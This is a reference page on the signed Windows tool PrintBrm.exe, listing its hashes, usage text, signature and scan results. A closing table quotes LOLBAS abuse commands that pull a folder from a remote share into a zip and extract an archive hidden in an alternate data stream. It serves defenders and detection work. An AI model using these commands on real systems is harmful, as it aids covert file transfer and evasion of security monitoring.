---
title: PrintBrm.exe | Print BRM command line tool
excerpt: What is PrintBrm.exe?
---

# PrintBrm.exe 

* File Path: `C:\Windows\system32\spool\tools\PrintBrm.exe`
* Description: Print BRM command line tool

## Hashes

Type | Hash
-- | --
MD5 | `D3BB8D39A9E5E574DE869AAC80E93433`
SHA1 | `5A65531FCF201369D6DF40EA592A66ECFFFF2BF2`
SHA256 | `71B5F4AA8D12DD4B7982B2D5607CB9B5F40C7E7676DC36F2AEEB482561117251`
SHA384 | `30F6DC186126B4F93C28D8969F5065DC9D1C32CE4C6C5469C32C796BCB57BA2E86875B5764B8B8B252AF242FB4EB6F3F`
SHA512 | `DB1C1D99EEF0A9262CEFB4824863101BB3F9B6698A026729146E7388B0675578D223E78006C1898E14B1AC766ED035174D2B019DC9D560E5E358F8199361FC00`
SSDEEP | `384:J6MYdFEU63Tj32q4gKX52R1XueGLujZYJQ7zRMjHJKqDT1n+0SNxTY/OlVufVXhm:4OU6j7tOJ2CI9rxapVDTuNh+Oryx3a2/`
IMP | `C41B1537E18BBD1DFB2420E52994CAEF`
PESHA1 | `123EF9F6F8E075CB38E43E6B991782F935DCC1C5`
PE256 | `06FD8CB7E9075B10554E557B7547A8B531CEFA681DE1418DE722E5F5324A8150`

## Runtime Data

### Usage (stdout):
```cmhg
Error: A single mode must be selected!

Access the Backup Recovery Migration tool through a command line interface.

PrintBrm -B|R|Q [-S <server>] -F <file> [-D <directory>] [-O FORCE] [-P ALL|ORIG] [-NOBIN] [-LPR2TCP] [-C <config file>] [-NOACL] [-?]
-B               Backup the server to the specified file
-R               Restore the configuration in the file to the server
-Q               Query the server or the backup file
-S <server name> Target server
-F <file name>   Target backup File
-D <directory>   Unpack the backup file to (with -R) or repack a backup file from (with -B) the given directory
-O FORCE         Force overwriting of existing objects
-P ALL|ORIG      Publish all printers in directory, or publish printers that were published originally
-NOBIN           Omit the binaries from the backup
-LPR2TCP         Convert LPR ports to Standard TCP/IP ports on restore
-C <file name>   Use the specified configuration file for BRM
-NOACL           Remove ACLs from print queues on restore
-?               Display this help

```

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: PrintBrm.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/70
* VirusTotal Link: https://www.virustotal.com/gui/file/71b5f4aa8d12dd4b7982b2d5607cb9b5f40c7e7676dc36f2aeeb482561117251/detection/


## Possible Misuse

*The following table contains possible examples of `PrintBrm.exe` being misused. While `PrintBrm.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `Name: PrintBrm.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Path: C:\Windows\System32\spool\tools\PrintBrm.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- IOC: PrintBrm.exe should not be run on a normal workstation`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


